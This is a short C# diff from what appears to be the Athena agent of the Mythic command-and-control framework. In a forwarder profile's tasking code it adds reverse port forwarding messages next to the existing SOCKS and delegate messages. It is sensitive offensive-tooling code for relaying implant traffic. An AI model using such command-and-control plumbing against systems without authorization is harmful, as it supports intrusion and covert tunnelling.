@@ -39,10 +39,12 @@ namespace Athena.Profiles.Forwarders.Models
             Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
             Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
             Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
-            await Task.WhenAll(responseTask, delegateTask, socksTask);
+            Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
+            await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);
             List<string> responses = responseTask.Result;
             List<DelegateMessage> delegateMessages = delegateTask.Result;
             List<MythicDatagram> socksMessages = socksTask.Result;
+            List<MythicDatagram> rpfwdMessages = rpFwdTask.Result;
 
             if (messages.Count > 0) //Checkin Message
             {
@@ -69,6 +71,7 @@ namespace Athena.Profiles.Forwarders.Models
                     delegates = delegateMessages,
                     socks = socksMessages,
                     responses = responses,
+                    rpfwd = rpfwdMessages,
                 };
 
                 string res = JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking);
